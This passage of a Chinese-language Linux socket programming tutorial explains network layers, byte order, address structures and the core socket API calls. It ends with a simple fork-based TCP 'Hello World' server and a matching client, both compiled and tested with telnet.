    拓扑对于程序员来说是透明的. 不说其它废话了, 现在列出整个层次模型. 如果你要参加网络考试, 
    可一定要记住:
        应用层      (Application)
        表示层      (Presentation)
        会话层      (Session)
        传输层      (Transport)
        网络层      (Network)
        数据链路层  (Data Link)
        物理层      (Physical)
    物理层是硬件(串口, 以太网等等). 应用层是和硬件层相隔最远的, 它是用户和网络交互的地方. 
    这个模型如此通用, 如果你想, 你可以把它作为修车指南. 把它对应到 linux 映射是:
        应用层      (Application Layer) (telnet, ftp, 等等)
        传输层      (Host-to-Host Transport Layer) (TCP, UDP)
        Internet 层 (Internet Layer) (IP和路由)
        网络访问层  (Network Access Layer) (网络层，数据链路层和物理层)
    现在, 你可能看到这些层次如何协调来封装原始的数据了. 看看建立一个简单的数据包有多少工作
    ? 哎呀, 你将不得不使用 "cat" 来建立数据包头! 这仅仅是个玩笑. 对于流式套接字你要作的是
    send() 发送数据. 对于数据报式套接字, 你按照你选择的方式封装数据然后使用 sendto(). 内
    核将为你建立传输层和 Internet 层, 硬件完成网络访问层. 这就是现代科技, 现在结束我们的
    网络理论速成班. 哦, 忘记告诉你关于路由的事情了. 但是我不准备谈它, 如果你真的关心, 那
    你可以自行搜阅 RFC 相关的协议定义部分.

### 7.2.2 socket 编程前奏

**结构体**

    终于谈到编程了. 在这小节, 我将谈到被套接字用到的各种数据类型. 因为它们中的一些
    内容很重要. 首先是简单的一个: socket 描述符. 它是下面的类型: int, 仅仅是一个
    常见的 int. 从现在起, 事情变得不可思议了, 而你所需做的就是继续看下去. 注意这
    样的事实:
    
    有两种字节排列顺序: 重要的字节 (有时叫"octet", 即八位位组) 在前面, 或者不重要
    的字节在前面. 前一种叫"网络字节顺序 (Network Byte Order)". 有些机器在内部是
    按照这个顺序储存数据, 而另外一些则不然. 当我说某数据必须按照 NBO 顺序, 那么你
    要调用函数(例如 htons())来将它从本机字节顺序 (Host Byte Order) 转换过来. 如
    果我没有提到 NBO, 那么就让它保持本机字节顺序. 我的第一个结构(在这个技术手册TM
    中) -- struct sockaddr. 这个结构为许多类型的套接字储存套接字地址信息：

```C
struct sockaddr {
    unsigned short sa_family;
    char sa_data[14];
};
```
    sa_family 能够是各种各样的类型, 但是在这篇文章中都是 "AF_INET". sa_data 包
    含套接字中的目标地址和端口信息. 这好像有点不明智. 为了处理 struct sockaddr,
    程序员创造了一个并列的结构: struct sockaddr_in ("in" 代表 "Internet".)

```C
struct sockaddr_in {
    short int sin_family;
    unsigned short int sin_port;
    struct in_addr sin_addr;
    unsigned char sin_zero[8];
};
```

    用这个数据结构可以轻松处理套接字地址的基本元素. 注意 sin_zero (它被加入到这
    个结构, 并且长度和 struct sockaddr 一样) 应该使用函数 bzero() 或 memset()
    来全部置零. 同时, 这一重要的字节, 一个指向 sockaddr_in 结构体的指针也可以被
    指向结构体 sockaddr 并且代替它. 这样的话即使 socket 想要的是 
    struct sockaddr, 你仍然可以使用 struct sockaddr_in, 并且在最后转换. 同时,
    注意 sin_family 和 struct sockaddr 中的 sa_family 一致并能够设置为 
    "AF_INET". 最后, sin_port 和 sin_addr 必须是网络字节顺序 
    (Network Byte Order)!

    你也许会反对道: "但是, 怎么让整个数据结构 struct in_addr sin_addr 按照网
    络字节顺序呢?" 要知道这个问题的答案, 我们就要仔细的看一看这个数据结构: 

```C
struct in_addr {
    unsigned long s_addr;
};
```

    它曾经是个最坏的联合(知道的都是有点年头了, 哎), 但是现在那些日子过去了. 如果
    你声明 ina 是数据结构 struct sockaddr_in 的实例, 那么 ina.sin_addr.s_addr
    就储存 4 字节的 IP 地址(使用网络字节顺序). 如果你不幸的系统使用的还是恐怖的
    联合 struct in_addr , 你还是可以放心 4 字节的 IP 地址并且和上面我说的一样.
    (这是因为使用了 #define 辅助定义)

**本机转换**

    我们现在到了新的章节. 我们曾经讲了很多网络到本机字节顺序的转换, 现在可以实
    践了! 你能够转换两种类型: short (两个字节) 和 long (四个字节). 这个函数对
    于变量类型 unsigned 也适用. 假设你想将 short 从本机字节顺序转换为网络字节
    顺序. 用 "h" 表示 "本机 (host)", 接着是 "to", 然后用 "n" 表示 " 网络 
    (network)", 最后用 "s" 表示 "short": h-to-n-s, 或者 htons() 
    ("Host to Network Short"). 太简单了...

    如果不是太傻的话, 你一定想到了由 "n", "h", "s", 和 "l" 形成的正确组合, 
    例如这里肯定没有 stolh() ("Short to Long Host") 函数, 不仅在这里没有, 
    所有场合都没有. 但是这里有:
        htons() -- "Host to Network Short"
        htonl() -- "Host to Network Long"
        ntohs() -- "Network to Host Short"
        ntohl() -- "Network to Host Long"
    现在, 你可能想你已经知道它们了. 你也可能想: "如果我想改变 char 的顺序要
    怎么办呢?" 但是你也许马上就想到, "用不着考虑的". 你也许会想到: 我的 IBM
    机器已经使用了网络字节顺序, 我没有必要去调用 htonl() 转换 IP 地址. 你可
    能是对的, 但是当你移植你的程序到别的机器上的时候, 你的程序将失败. 可移植
    性! 这里是 linux 世界! 记住: 在你将数据放到网络上的时候, 确信它们是网络字
    节顺序的. 最后一点: 为什么在数据结构 struct sockaddr_in 中, sin_addr 
    和 sin_port 需要转换为网络字节顺序, 而 sin_family 需不需要呢? 答案是: 
    sin_addr 和 sin_port 分别封装在包的 IP 和 UDP 层. 因此, 它们必须要是网
    络字节顺序. 但是 sin_family 域只是被内核 (kernel) 使用来决定在数据结构
    中包含什么类型的地址, 所以它必须是本机字节顺序. 同时, sin_family 没有发
    送到网络上, 它们可以是本机字节顺序.

**IP 地址和如何处理它们**

    现在我们很幸运, 因为我们有很多的函数来方便地操作 IP 地址. 没有必要用手工
    计算它们, 也没有必要用 "<<" 操作来储存成长整字型. 首先, 假设你已经有了一
    个 sockaddr_in 结构体 ina, 你有一个 IP 地址 "202.113.96.11" 要储存在其
    中, 你就要用到函数 inet_addr(), 将 IP 地址从点数格式转换成无符号长整型. 
    使用方法如下：
        ina.sin_addr.s_addr = inet_addr("202.113.96.11");
    注意, inet_addr() 返回的地址已经是网络字节格式, 所以你无需再调用函数 
    htonl(). 我们现在发现上面的代码片断不是十分完整的, 因为它没有错误检查. 显
    而易见, 当 inet_addr() 发生错误时返回-1. 记住这些二进制数字? (无符号数)
    -1 仅仅和 IP 地址 255.255.255.255 相符合! 这可是广播地址! 大错特错! 记住
    要先进行错误检查. 好了, 现在你可以将 IP 地址转换成长整型了. 有没有其相反的
    方法呢? 它可以将一个in_addr 结构体输出成点数格式? 这样的话, 你就要用到函数
    inet_ntoa()("ntoa"的含义是"network to ascii"), 就像这样:
        printf("%s",inet_ntoa(ina.sin_addr));
    它将输出 IP 地址. 需要注意的是 inet_ntoa() 将结构体 in_addr 作为一个参数,
    不是长整形. 同样需要注意的是它返回的是一个指向一个字符的指针. 它是一个由 
    inet_ntoa() 控制的静态的固定的指针, 所以每次调用 inet_ntoa(), 它就将覆
    盖上次调用时所得的 IP 地址. 例如:
        char * a1, * a2;
        a1 = inet_ntoa(ina1.sin_addr);
        a2 = inet_ntoa(ina2.sin_addr);
        printf("address 1: %s/n",a1);
        printf("address 2: %s/n",a2);
    输出如下：
    address 1: 202.113.96.11
    address 2: 202.113.96.11

    以上在学习阶段或者是单线程程序中是没有任何问题的. 然而真实环境开发中使用
    的是

```C
#include <arpa/inet.h>
// return : 1 - 成功, 0 - 输入不是有效的表达式, -1 - 出错
int inet_pton(int family, const char * strptr, void * addrptr);         
// return : 指向结果的指针 - 成功, NULL - 出错
const char * inet_ntop(int family, const void * addrptr, char * strptr, size_t len);
```

    上面就是关于这个主题的介绍. 

### 7.2.3 编程中常见 API

**socket() 函数**

    我想我不能再不提这个了－下面我将讨论一下 socket() 系统调用. 下面是详细介绍:

```C
#include <sys/types.h>
#include <sys/socket.h>
int socket(int domain, int type, int protocol);
```

    但是它们的参数是什么? 首先, domain 应该设置成 "PF_INET", 就像上面的数据
    结构 struct sockaddr_in 中一样. 然后, 参数 type 告诉内核是 SOCK_STREAM
    类型还是 SOCK_DGRAM 类型. 最后, 把 protocol 设置为 "0". (注意: 有很多种
    domain, type, 我不可能一一列出了, 请看 socket() 的 man 帮助. 当然, 还有
    一个"更好"的方式去得到 protocol. 同时请查阅 getprotobyname() 的 man 帮
    助) 常用例子

```C
// 使用系统针对 IPv4 与字节流的默认的协议，一般为 TCP
int sockfd=socket(PF_INET, SOCK_STRAM, IPPROTO_TCP);
// 使用 STCP 作为协议
int sockfd=socket(PF_INET, SOCK_STRAM, IPPROTO_SCTP);
// 使用数据报
int sockfd=socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
```

    socket() 只是返回你以后在系统调用种可能用到的 socket 描述符, 或者在错误
    的时候返回-1. 全局变量 errno 中将储存返回的错误值. (请参考 perror() 的
    man 帮助.)

**bind() 函数**

    一旦你有一个套接字, 你可能要将套接字和机器上的一定的端口关联起来. (如果
    你想用 listen() 来侦听固定端口的数据, 这是必要一步 -- MUD 告诉你说用命
    令 "telnet x.y.z 6969".) 如果你只想用 connect(), 那么这个步骤没有必要.
    但是无论如何, 请继续读下去. 这里是系统调用 bind() 的大概: 

```C
#include <sys/types.h>
#include <sys/socket.h>
int bind(int sockfd, struct sockaddr * my_addr, int addrlen);
```

    sockfd 是调用 socket 返回的文件描述符. my_addr 是指向数据结构 
    struct sockaddr 的指针, 它保存你的地址(即端口和 IP 地址)信息. addrlen
    设置为 sizeof(struct sockaddr). 很简单不是吗? 再看看例子:

```C
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#define _INT_PORT	(3490)

int main(void) {
    struct sockaddr_in my_addr;
    int sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(_INT_PORT);
    my_addr.sin_addr.s_addr = inet_addr("202.113.96.11");
    bzero(&my_addr.sin_zero, sizeof(my_addr.sin_zero));
    bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr));
    ... ...
}
```

    这里也有要注意的几件事情. my_addr.sin_port 是网络字节顺序, 
    my_addr.sin_addr.s_addr 也是的. 另外要注意到的事情是因系统的不同, 包含的头
    文件也不尽相同, 请查阅本地的 man 帮助文件. 上面 bzero 是 Linux 上独有的, 在
    string.h 下. 等同于
        memset(&my_addr.sin_zero, 0, sizeof(my_addr.sin_zero));
    在 bind() 主题中最后要说的话是, 在处理自己的 IP 地址和/或端口的时候, 有些工
    作是可以自动处理的.
        my_addr.sin_port = 0;
        my_addr.sin_addr.s_addr = INADDR_ANY;
    通过将 0 赋给 my_addr.sin_port, 你告诉 bind() 自己选择合适的端口. 同样, 
    将 my_addr.sin_addr.s_addr 设置为 INADDR_ANY, 你告诉它自动填上它所运行的
    机器的 IP 地址. 如果你一向小心谨慎, 那么你可能注意到我没有将 INADDR_ANY 转
    换为网络字节顺序! 这是因为我知道内部的东西: INADDR_ANY 实际上就是 0! 即使你
    改变字节的顺序, 0 依然是 0. 但是完美主义者说应该处处一致, INADDR_ANY 或许是
    12 呢? 你的代码就不能工作了, 那么就看下面的代码:
        my_addr.sin_port = htons(0);
        my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    你或许不相信, 上面的代码将可以随便移植. 我只是想指出, 既然你所遇到的程序不会
    都运行使用 htonl 的 INADDR_ANY.

    bind() 在错误的时候依然是返回-1, 并且设置全局错误变量 errno. 在你调用 bind()
    的时候, 你要小心的另一件事情是: 不要采用小于 1024 的端口号. 所有小于 1024 的
    端口号都被系统保留! 你可以选择从 1024 到 65535 的端口(如果它们没有被别的程序
    使用的话). 你要注意的另外一件小事是: 有时候你根本不需要调用它. 如果你使用 
    connect() 来和远程机器进行通讯, 你不需要关心你的本地端口号(就像你在使用 telnet
    的时候), 你只要简单的调用 connect() 就可以了, 它会检查套接字是否绑定端口, 如果
    没有, 它会自己绑定一个没有使用的本地端口.

**connect() 程序**

    现在我们假设你是个 telnet 程序. 你的用户命令你得到套接字的文件描述符. 你听
    从命令调用了 socket(). 下一步, 你的用户告诉你通过端口 23(标准 telnet 端口)
    连接到"202.113.96.11". 你该怎么做呢? 幸运的是, 你正在阅读 connect() -- 如
    何连接到远程主机这一章. 你可不想让你的用户失望. connect() 系统调用是这样的：

```C
#include <sys/types.h>
#include <sys/socket.h>
int connect(int sockfd, struct sockaddr * serv_addr, int addrlen);
```

    sockfd 是系统调用 socket() 返回的套接字文件描述符. serv_addr 是保存着目
    的地端口和 IP 地址的数据结构 struct sockaddr. addrlen 设置为 
    sizeof(struct sockaddr). 想知道得更多吗? 让我们来看个例子:

```C
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#define _STR_IP		"202.113.96.11"
#define _INT_PORT	(23)

int main(void) {
    struct sockaddr_in addr;
    int sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(_INT_PORT);
    addr.sin_addr.s_addr = inet_addr(_STR_IP);
    bzero(&addr.sin_zero, sizeof(addr.sin_zero));
    connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr));
    ... ...
}
```

    再一次，你应该检查 connect() 的返回值 - 它在错误的时候返回-1, 并设置全局
    错误变量 errno. 
    
    同时, 你可能看到, 我没有调用 bind(). 因为我不在乎本地的端口号. 我只关心我
    要去那. 内核将为我选择一个合适的端口号, 而我们所连接的地方也自动地获得这些
    信息. 一切都不用担心.

**listen() 函数**

    是换换内容得时候了. 假如你不希望与远程的一个地址相连, 或者说, 仅仅是将它
    踢开, 那你就需要等待接入请求并且用各种方法处理它们. 处理过程分两步: 首先, 
    你监听 - listen(), 然后, 你接受 - accept() (请看下面的内容).
    除了要一点解释外，系统调用 listen 也相当简单.
        int listen(int sockfd, int backlog);
    sockfd 是调用 socket() 返回的套接字文件描述符. backlog 是在进入队列中
    允许的连接数目. 什么意思呢? 进入的连接是在队列中一直等待直到你接受 
    (accept() 请看下面的文章)连接. 它们的数目限制于队列的允许. 大多数系统的
    允许数目是 20, 你也可以设置为 5 到 10 甚至最大, 但是最终用不用系统决定.
    和别的函数一样, 在发生错误的时候返回-1, 并设置全局错误变量 errno.
    你可能想象到了, 在你调用 listen() 前你或者要调用 bind() 或者让内核随便
    选择一个端口. 如果你想侦听进入的连接, 那么系统调用的顺序可能是这样的:
        socket();
        bind();
        listen();
    因为它相当的明了, 我将在这里不给出例子了. (在 accept() 的代码将更加完全)
    真正麻烦的部分在 accept().

**accept() 函数**

    准备好了, 系统调用 accept() 会有点古怪的地方的! 你可以想象发生这样的事情:
    有人从很远的地方通过一个你在侦听 (listen()) 的端口连接 (connect()) 到你
    的机器. 它的连接将加入到等待接受 (accept()) 的队列中. 你调用 accept() 告
    诉它你有空闲的连接. 它将返回一个新的套接字文件描述符! 这样你就有两个套接字
    了, 原来的一个还在侦听你的那个端口, 新的在准备发送 (send()) 和接收 
    (recv()) 数据. 这就是这个过程! 函数是这样定义的:

```C
#include <sys/socket.h>
int accept(int sockfd, void * addr, int * addrlen);
```

    sockfd 相当简单, 是和 listen() 中一样的套接字描述符. addr 是个指向局部的
    数据结构 sockaddr_in 的指针. 这是要求接入的信息所要去的地方(你可以测定那
    个地址在那个端口呼叫你). 在它的地址传递给 accept 之 前, addrlen 是个局部
    的整形变量, 设置为 sizeof(struct sockaddr_in). accept 将不会将多余的字
    节给 addr. 如果你放入的少些, 那么它会通过改变 addrlen 的值反映出来. 需要
    注意的是 addrlen 即是输入也是输出参数, 开始之前需要写成
        int sin_size = sizeof(struct sockaddr_in); 
    后面传入 &sin_size. 同样, 在错误时返回-1, 并设置全局错误变量 errno.
    现在是你应该熟悉的代码片段.

```C
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#define _INT_PORT		(3490)

int main(void) {
    int sockfd, nfd;
    struct sockaddr_in saddr, caddr;
    int clen = sizeof(struct sockaddr_in);
    sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(_INT_PORT);
    saddr.sin_addr.s_addr = INADDR_ANY;
    bzero(&saddr.sin_zero, sizeof(saddr.sin_zero));
    bind(sockfd, (struct sockaddr *)&saddr, clen);
    listen(sockfd, SOMAXCONN);
    nfd = accept(sockfd, &caddr, &clen);
    ... ...
}
```

    注意, 在系统调用 send() 和 recv() 中你应该使用新的套接字描述符 nfd. 
    如果你只想让一个连接进来, 那么你可以使用 close() 去关闭原来的文件描述符
    sockfd 来避免同一个端口更多的连接.

**send() and recv() 函数**

    这两个函数用于流式套接字或者数据报套接字的通讯. 如果你喜欢使用无连接的数据
    报套接字, 你应该看一看下面关于 sendto() 和 recvfrom() 的章节. send() 是
    这样的:
        int send(int sockfd, const void * msg, int len, int flags);
    sockfd 是你想发送数据的套接字描述符(或者是调用 socket() 或者是 accept()
    返回的.) msg 是指向你想发送的数据的指针. len 是数据的长度. 把 flags 设置
    为 0 就可以了. (详细的资料请看 send() 的 man page). 这里是可能的例子：
        char * msg = "Beej was here!";
        int len, bytes_sent;
        len = strlen(msg);
        bytes_sent = send(sockfd, msg, len, 0);
    send() 返回实际发送的数据的字节数 - 它可能小于你要求发送的数目! 注意, 有时
    候你告诉它要发送一堆数据可是它不能处理成功. 它只是发送它可能发送的数据, 然
    后希望你能够发送其它的数据. 记住, 如果 send() 返回的数据和 len 不匹配, 你
    就应该发送其它的数据. 但是这里也有个好消息: 如果你要发送的包很小(小于大约 
    1K), 它可能处理让数据一次发送完. 最后要说得就是, 它在错误的时候返回-1, 并
    设置 errno. recv() 函数很相似:
        int recv(int sockfd, void *buf, int len, unsigned int flags);
    sockfd 是要读的套接字描述符. buf 是要读的信息的缓冲. len 是缓冲的最大长度.
    flags 可以设置为 0. (请参考 recv() 的 man page) recv() 返回实际读入缓冲
    的数据的字节数. 或者在错误的时候返回-1, 同时设置 errno.
    
    很简单，不是吗? 你现在可以在流式套接字上发送数据和接收数据了. 
    你现在是 linux 网络程序员了!

**sendto() 和 recvfrom() 函数**

    "这很不错啊", 你说, "但是你还没有讲无连接数据报套接字呢?" 没问题, 现在我
    们开始这个内容. 既然数据报套接字不是连接到远程主机的, 那么在我们发送一个包
    之前需要什么信息呢? 不错, 是目标地址! 看看下面的:
    int sendto(int sockfd, const void * msg, int len, unsigned int flags,
    const struct sockaddr * to, int tolen);
    你已经看到了, 除了另外的两个信息外, 其余的和函数 send() 是一样的. to 是个
    指向数据结构 struct sockaddr 的指针, 它包含了目的地的 IP 地址和端口信息. 
    tolen 可以简单地设置为 sizeof(struct sockaddr). 和函数 send() 类似, 
    sendto() 返回实际发送的字节数(它也可能小于你想要发送的字节数!), 或者在错误
    的时候返回 -1. 相似的还有函数 recv() 和 recvfrom(). recvfrom() 的定义是
    这样的:
    int recvfrom(int sockfd, void * buf, int len, unsigned int flags,
    struct sockaddr * from, int * fromlen);
    又一次, 除了两个增加的参数外, 这个函数和 recv() 也是一样的. from 是一个指
    向局部数据结构 struct sockaddr 的指针, 它的内容是源机器的 IP 地址和端口信
    息. fromlen 是个 int 型的局部指针, 它的初始值为 sizeof(struct sockaddr).
    函数调用返回后, fromlen 保存着实际储存在 from 中的地址的长度. recvfrom()
    返回收到的字节长度, 或者在发生错误后返回 -1. 记住, 如果你用 connect() 连接
    一个数据报套接字, 你可以简单的调用 send() 和 recv() 来满足你的要求. 这个时
    候依然是数据报套接字, 依然使用 UDP, 系统套接字接口会为你自动加上了目标和源
    的信息.

**close() 和 shutdown() 函数**

    你已经整天都在发送 (send()) 和接收 (recv()) 数据了, 现在你准备关闭你的
    套接字描述符了. 这很简单, 你可以使用一般的 linux 文件描述符 的 close() 函
    数：
        close(sockfd);
    它将防止套接字上更多的数据的读写. 任何在另一端读写套接字的企图都将返回错误
    信息. 如果你想在如何关闭套接字上有多一点的控制, 你可以使用函数 shutdown().
    它允许你将一定方向上的通讯或者双向的通讯(就象 close() 一样)关闭, 你可以使
    用:
        int shutdown(int sockfd, int how);
    sockfd 是你想要关闭的套接字文件描述复. how 的值是下面的其中之一:

```C
#define SD_RECEIVE      0x00
#define SD_SEND         0x01
#define SD_BOTH         0x02
```
    其实含义如下
    0 - 不允许接受
    1 - 不允许发送
    2 - 不允许发送和接受(和 close() 一样)
    shutdown() 成功时返回 0, 失败时返回 -1(同时设置 errno) 如果在无连接的数
    据报套接字中使用 shutdown(), 那么只不过是让 send() 和 recv() 不能使用(记
    住你在数据报套接字中使用了 connect 后是可以使用它们的)

**getpeername() and gethostname() 函数**

    这个函数太简单了. 它太简单了, 以至我只想简单说说. 函数 getpeername() 告
    诉你在连接的流式套接字上谁在另外一边. 函数是这样的:

```C
#include <sys/socket.h>
int getpeername(int sockfd, struct sockaddr * addr, int * addrlen);
```
    sockfd 是连接的流式套接字的描述符. addr 是一个指向结构 struct sockaddr 
    内存布局的的指针, 它保存着连接的另一边的信息. addrlen 是一个 int 型的指针,
    它初始化为 sizeof(struct sockaddr). 函数在错误的时候返回-1, 设置相应的 
    errno. 一旦你获得它们的地址, 你可以使用 inet_ntoa() 或者 gethostbyaddr()
    来打印或者获得更多的信息. 但是你不能得到它的帐号. (如果它运行着愚蠢的守护进
    程, 这是可能的, 但是它的讨论已经超出了本文的范围, 可自行上路)
    
    甚至比 getpeername() 还简单的函数是 gethostname(). 它返回你程序所运行的
    机器的主机名字. 然后你可以使用 gethostbyname() 以获得你的机器的 IP 地址.
    下面是定义:

```C
#include <unistd.h>
int gethostname(char * hostname, size_t size);
```

    参数很简单: hostname 是一个字符数组指针, 它将在函数返回时保存主机名. 
    size 是 hostname 数组的字节长度. 函数调用成功时返回 0, 失败时返回 -1, 
    并设置 errno.

### 7.2.4 编程演练

**域名服务(DNS)**

    如果你不知道 DNS 的意思, 那么我告诉你, 它代表域名服务 (Domain Name Service)
    . 它主要的功能是: 你给它一个容易记忆的某站点的地址, 它给你 IP 地址(然后你就
    可以使用 bind(), connect(), sendto() 或者其它函数). 当一个人输入(只是演示,
    墙过不去):
    $ telnet www.google.com
    (可以用 dig 指令来看域名的 ip [dig url])
    telnet 能知道它将连接(connect()) 到 "93.46.8.89".
 
    但是这是如何工作的呢? 你可以调用函数 gethostbyname()：

```C
#include <netdb.h>
struct hostent * gethostbyname(const char *name);
```

    很明白的是, 它返回一个指向 struct hostent 的指针. 这个数据结构是这样的:

```C
    // The hostent structure is defined in <netdb.h> as follows:
    struct hostent {
        char *  h_name;           /* official name of host */
        char ** h_aliases;        /* alias list */
        int     h_addrtype;       /* host address type */
        int     h_length;         /* length of address */
        char ** h_addr_list;      /* list of addresses */
    }
    #define h_addr h_addr_list[0] /* for backward compatibility */
```

    这里是这个数据结构的详细资料:
    struct hostent:
    h_name			- 地址的正式名称.
    h_aliases		- 空字节-地址的预备名称的指针.
    h_addrtype		- 地址类型; 通常是 AF_INET.
    h_length		- 地址的比特长度.
    h_addr_list		- 零字节-主机网络地址指针.网络字节顺序.
    h_addr			- h_addr_list 中的第一地址.

    gethostbyname() 成功时返回一个指向结构体 hostent 的指针, 或者是个NULL
    指针. (但是和以前不同, 不设置 errno, 用 h_errno 设置错误信息, 请看下面
    的herror()) 扩展一下关于 gethostbyname 返回值是内部 static 维护的内存
    空间, 不需要释放. 对于多线程要求的程序使用 gethostbyname_r. 更高性能要
    求的领域使用开源的 dns 解析函数吧! 但是如何使用呢? 有时候(我们可以从电脑
    手册中发现) 向读者灌输信息是不够的. 这个函数可不象它看上去那么难用. 这里
    是个例子:

文件名 : getip.c

```C
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <arpa/inet.h>

//
// test url: http://www.cnblogs.com/life2refuel/
//
int main(int argc, char * argv[]) {
	int type;
	char ** pptr;
	struct hostent * host;
	
	if(argc != 2) {
		fprintf(stderr, "usage: ./getip.exe [url]\n");
		exit(EXIT_FAILURE);
	}

	if(!(host = gethostbyname(argv[1]))) {
		herror("main gethostbyname error");
		exit(EXIT_FAILURE);
	}

	// 打印所有信息, 主机信息
	printf("Host name is: %s.\n", host->h_name);
	for(pptr = host->h_aliases; (*pptr); ++pptr)
		printf("Alias of host:%s.\n", *pptr);
	printf("Host addrtype is: %d.\n", type = host->h_addrtype);
	printf("Host length is:%d.\n", host->h_length);
	if(type == AF_INET || type == AF_INET6) {
		char ip[sizeof "255.255.255.255"];
		for(pptr = host->h_addr_list; (*pptr); ++pptr) {
			inet_ntop(type, *pptr, ip, sizeof ip);
			printf("Address:%s.\n", ip);
		}
	}

	return EXIT_SUCCESS;
}
```

    编译命令:
    gcc -g -Wall -O2 -o getip.exe getip.c
    执行命令:
    ./getip.exe www.cnblogs.com
    运行截图:

![getip](./img/getip.png)

    在使用 gethostbyname() 的时候, 你不能用 perror() 打印错误信息 (因为 errno
    没有使用, 使用的是h_errno), 你应该调用 herror(). 相当简单, 你只是传递一个保
    存机器名的字符串(例如 "www.cnblogs.com") 给 gethostbyname(), 然后从返回的数
    据结构 struct hostent 中获取信息. 唯一也许让人不解的是输出 IP 地址信息. 
    h->h_addr 是一个 char *, 但是 inet_ntop() 需要的是 struct in_addr. 因此, 
    转换 h->h_addr 成 struct in_addr *, 然后得到数据.

**客户-服务器背景知识**

    这里是个客户 - 服务器的世界. 在网络上的所有东西都是在处理客户进程和服务器进
    程的交谈. 举个 telnet 的例子. 当你用 telnet (客户)通过 23 号端口登陆到主机,
    主机上运行的一个程序(一般叫 telnetd, 服务器)激活. 它处理这个连接, 显示登陆界
    面, 等等. 下图是一种: 客户机和服务器的关系

![客户端通信](./img/客户端通信.png)

    注意, 客户--服务器之间可以使用 SOCK_STREAM , SOCK_DGRAM 或者其它(只要它们
    采用相同的). 一些很好的客户 - 服务器的例子有 telnet/telnetd, ftp/ftpd 和
    bootp/bootpd. 每次你使用 ftp 的时候, 在远端都有一个 ftpd 为你服务. 一般, 
    在服务端只有一个服务器, 它采用 fork() 来处理多个客户的连接. 基本的程序是: 服
    务器等待一个连接, 接受(accept()) 连接, 然后 fork() 一个子进程处理它. 这是下
    一章我们的例子中会讲到的. 还有一种通过 pthread 流程处理的都相似, 也比较容易
    理解如下:

~[编程模式](./img/编程模式.png)


**简单的服务器**

    这个服务器所做的全部工作是在流式连接上发送字符串 "Hello, World!\n". 你要
    测试这个程序的话, 可以在一台机器上运行该程序, 然后在另外一机器上登陆:
    $ telnet [address] [port]  # 是该程序运行的机器的名字.

simple_srv.c 服务器代码:

```C
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define _INT_PORT	(8088)
#define _STR_HEOO	"Hello World!\n"

#define CERR_IF(code) \
    if((code) < 0) \
        perror(#code), exit(EXIT_FAILURE)

//
// simple server send heoo to client
//
int main(int argc, char * argv[]) {
	int sfd;
	struct sockaddr_in saddr = { AF_INET };
	CERR_IF(sfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP));
	saddr.sin_port = htons(_INT_PORT);
	saddr.sin_addr.s_addr = INADDR_ANY;
	CERR_IF(bind(sfd, (struct sockaddr *)&saddr, sizeof saddr));
	//监听一下
	CERR_IF(listen(sfd, SOMAXCONN));
	//下面就是采用单进程 处理 客户端链接请求
	for(;;){
		int cfd, fd;
		struct sockaddr_in caddr;
		socklen_t clen = sizeof caddr;
		CERR_IF(cfd = accept(sfd, (struct sockaddr *)&caddr, &clen));
		//输出 客户端信息
		printf("get connection from %s.\n", inet_ntoa(caddr.sin_addr));
		// 开启多进程, fd == 0 是子进程处理
		CERR_IF(fd = fork()); 
		if(fd == 0) {
			close(sfd);
			write(cfd, _STR_HEOO, strlen(_STR_HEOO));
			close(cfd);
			exit(EXIT_SUCCESS);
		}
		
		//父进程原先逻辑
		close(cfd);
		//为子进程收尸吧
		while(waitpid(-1, NULL, WNOHANG) > 0)
			;
	}
	
	return close(sfd);
}
```

    编译命令:
    gcc -g -O2 -Wall -Wno-unused-result -o simplec_srv.exe simplec_srv.c
    后面就可以利用 telnet 进行测试了. 先开启服务器

![先开启服务器](./img/先开启服务器.png)

    用 telnet 客户端链接

![客户端链接](./img/客户端链接.png)

    看服务器结果, 最后 Ctrl + C 结束服务器

![结束服务器](./img/结束服务器.png)

    如果你很挑剔的话, 一定不满意所有的代码都在一个很大的 main() 函数中. 如果你不
    喜欢, 可以划分得更细点. 你也可以用我们下一章中的程序得到服务器端发送的字符串.

**简单的客户程序**

    这个程序比服务器还简单. 这个程序的所有工作是通过 8088 端口连接到命令行中指定
    的主机, 然后得到服务器发送的字符串.

客户端代码 : simple_clt.c

```C
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define _INT_PORT   (8088)

#define CERR_IF(code) \
    if((code) < 0) \
        perror(#code), exit(EXIT_FAILURE)

// 打印数据
static void _print(char buf[], int len) {
    int i = -1;
    while(++i < len)
        putchar(buf[i]);
    fflush(stdout);
}

int main(int argc, char * argv[]) {
    int sfd, len;
    char buf[BUFSIZ];
    struct sockaddr_in saddr = { AF_INET };
    CERR_IF(sfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP));
    saddr.sin_port = htons(_INT_PORT);
    saddr.sin_addr.s_addr = INADDR_ANY;
    //链接一下
    CERR_IF(connect(sfd, (struct sockaddr *)&saddr, sizeof saddr));
    // 接收消息直到结束
    while((len = read(sfd, buf, sizeof buf)) > 0)
        _print(buf, len);

    return close(sfd);
}
```

    编译命令:
    gcc -g -O2 -Wall -Wno-unused-result -o simplec_clt.exe simplec_clt.c
    测试结果图, 开启服务器, 运行客户端, 查看结果并关闭服务器

![简易客户端01](./img/简易客户端01.png)

![简易客户端02](./img/简易客户端02.png)

    注意, 如果你在运行服务器之前运行客户程序, connect() 将返回 "Connection refused"
    信息, 这非常有用. 如下图

![简易客户端03](./img/简易客户端03.png)

